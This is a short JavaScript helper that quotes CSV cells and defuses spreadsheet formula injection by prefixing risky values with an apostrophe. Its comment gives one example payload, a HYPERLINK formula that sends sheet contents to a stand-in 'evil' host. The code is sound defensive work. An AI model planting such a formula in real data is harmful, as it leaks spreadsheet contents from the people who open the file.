// One CSV cell, quoted and safe to open in Excel/Sheets. Lead and partner
// data can come from outside (the inbound API, the public registration
// endpoint), and a value starting with = + - @ (or a tab/CR) is run as a
// FORMULA by spreadsheet apps - e.g. a customer named
// =HYPERLINK("http://evil/?"&A1,"x") would leak the sheet when clicked. A
// leading apostrophe makes the spreadsheet treat it as plain text.
export function csvCell(value) {
  let text = String(value ?? '');
  if (/^[=+\-@\t\r]/.test(text)) text = `'${text}`;
  return `"${text.replace(/"/g, '""')}"`;
}
